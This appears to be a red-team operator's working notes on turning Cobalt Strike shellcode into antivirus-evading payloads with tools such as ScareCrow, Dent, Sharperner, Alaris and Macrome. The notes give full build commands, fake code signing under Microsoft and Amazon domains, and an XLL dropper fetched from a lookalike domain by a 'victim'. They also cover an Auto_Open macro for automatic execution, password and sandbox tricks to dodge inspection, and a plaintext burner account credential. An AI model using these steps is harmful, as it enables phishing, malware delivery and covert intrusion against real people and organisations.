# BananaPhone
````
git clone https://github.com/C-Sto/BananaPhone
cd BananaPhone
go generate .
cd BananaPhone/example/hideexample/banana/
````
Generate 64bit C# shellcode in CobaltStrike
![39f96ad5dc1dfcb47e0545abcac55270.png](../_resources/39f96ad5dc1dfcb47e0545abcac55270.png)
Remove all but the bytecode from payload.cs, copy to clipboard
Open main.go in a text editor, delete the calc shellcode and replace with CS payload shellcode
![cb1aaa4285dd08bb078d63193ac2ab10.png](../_resources/cb1aaa4285dd08bb078d63193ac2ab10.png)
````
env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui
````
Should now have a banana.exe payload

# Signed BananaPhone
````
git clone https://github.com/Tylous/Limelighter
cd Limelighter
go get github.com/fatih/color
go build Limelighter.go
./Limelighter -Domain aws.amazon.com -I ../banana.exe -O signedbanana.exe
````
![5a8ec5eef4a19a9d7c55b7f7f6ff59c1.png](../_resources/5a8ec5eef4a19a9d7c55b7f7f6ff59c1.png)

# ScareCrow

````
git clone https://github.com/optiv/ScareCrow
cd ScareCrow
go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo
go build ScareCrow.go
````
Generate Raw 64bit shellcode in CobaltStrike: Attacks > Packages > Payload Generator
## Scarecrow.exe
````
./ScareCrow -I ../payload64.bin -Loader binary -domain microsoft.com
````
![f7b94c2df7817b5ebe1c80d2de764e7a.png](../_resources/f7b94c2df7817b5ebe1c80d2de764e7a.png)
## Scarecrow.js
````
./ScareCrow -I ../payload64.bin -Loader control -O scarecrow.js -domain microsoft.com
````
# Dent
````
git clone https://github.com/optiv/Dent
cd Dent
go build Dent.go
````
Generate a raw, stageless 64bit payload in CobaltStrike
![03659214b0ecc91617336f4e68fc5be7.png](../_resources/03659214b0ecc91617336f4e68fc5be7.png)
````
./ScareCrow/ScareCrow -I ../beacon64.bin -domain aws.amazon.com -Loader excel -O dent.xll
````
New ScareCrow builds the shellcode over several lines. To carve out the shellcode: 
````
sed '1,13d' dent.xll|tac|sed '1,26d'|tac|cut -d "\"" -f 2|tr -d "\n" > tmp;mv tmp dent.xll
````
````
./Dent -N XLSX.xll -U https://aws-portal.org/ -F dent.xll
-N: name of file saved on victim machine
-U: URL hosting payload, make sure you format like above
-F: File hosted on URL for victim to grab
````
![0d0c55549d657e0dcf7b2ad8d4eef075.png](../_resources/0d0c55549d657e0dcf7b2ad8d4eef075.png)
Should see output.txt built in Dent directory
Open Excel on a Windows machine
Create a new file and save it as an XLS
View > Macros > random name >"Macros in: \<name\>.xls" > Create
Copy and paste macro from output.txt into macro here
Host dent.xll in CobaltStrike (make sure it matches Dent command, in this case https://aws-portal.org/dent.xll)
Press play button in Excel to test
Should recieve a beacon
Add an another Sub to the macro to make it auto run
````
Sub Auto_Open()
    aMmlwWnC #random name of the dent sub from output.txt
End Sub
````
Note: Dent has a kink where it will hang in the orginal excel process. If the user uses task manager to close excel, will retain access. Little sus, find a way to fix.

# Sharperner
https://github.com/aniqfakhrul/Sharperner
Burner Outlook for Visual Studio- wbtburna@outlook.com:ImAPassword123

Generate a raw, stageless 64bit executable in CobaltStrike
Transfer it to a Windows PC
On Windows, download the Sharpener repo from Github
Open the csproj file in Visual Studio (creds above if need account)
Build the solution
Sharperner.exe should be in %SharpenerDir%/bin/Releases/Sharperner.exe
```
Sharperner.exe /file:payload_raw64.bin /type:cs
```
Sharperner will output an exe with a benign name.
And that's it!
#Look into detection stats, donut if necessary

# Alaris
https://github.com/cribdragg3r/Alaris
Burner Outlook for Visual Studio- wbtburna@outlook.com:ImAPassword123

Generate a raw, C# payload in CobaltStrike
Transfer it to a Windows PC
On Windows, download the Alaris repo from Github
In the exracted Alaris-master directory, run:
```python
pip install -r requirements.txt
```
Open the sln file in Visual Studio (creds above if need account)
Update any missing dependencies (c++)
In the Alaris-master directory run:
```python
builder.py -s payload64.bin -p <whatever you want>
```
Should output loader.exe #Note: Does not execute on Commando, try on Win10 VM
If desired, can sign with Limelighter for better AV bypass

# Macrome

## Installing
* Build with visual stuido or grab the latest release (https://github.com/michaelweber/Macrome/releases/tag/v0.5.0)
    * I've been just grabbing the latest release as I'm lazy, though its bad practice

## Generating Payloads
* v5 made things a lot simpler as he baked in a few of the evasion techniques
* For either type generate two Windows Executable (S) [RAW] payloads
    * One x86 and the other x64
* Change to your Macrome folder and run the following
    * Note: don't change the password, this will keep (some) AVs from inspecting, but will still auto open for a regular user

```bash
dotnet b Macrome.dll --decoy-document decoy_document.xls --payload beacon.bin --payload64-bit beacon64.bin --payload-method Base64 --method ArgumentSubroutines --password VelvetSweatshop --output-file-name 11-https-macrome.xls
```

* If that works, build another with sandbox evasion baked in.
    * I've been using the preamble.txt file that comes default, but you can edit this to check for other things aside from screen resolution
        * Check the github if you are interested
    * If the preamble requirements aren't met, the document will just exit neatly, good little trick.

```bash
dotnet b Macrome.dll --decoy-document decoy_document.xls --payload beacon.bin --payload64-bit beacon64.bin --payload-method Base64 --method ArgumentSubroutines --password VelvetSweatshop --output-file-name --preamble preamble.txt 12-https-macrome-sandbox.xls
```

## Making it pretty
* If you go with macrome for a final payload
    * Save off a copy of the one that worked (or generate a new one) to your commando desktop
    * Unhide the hidden sheet first (breaks things if not)
    * Do all the fancy things you need to do
	* Helps to ctrl+a and change the font first
    * Re-hide that tab
    * Save and it should (hopefully) work. 

# Checkout
https://github.com/ByteJunkies-co-uk/Metsubushi

# Bankai
Go Shellcode Loader
https://github.com/bigb0sss/Bankai
Create Fiber

# AutoMigrate.cna
https://github.com/threatexpress/aggressor-scripts/blob/master/beacon_handler/modules/automigrate.cna

# BruteLoops
https://github.com/arch4ngel/BruteLoops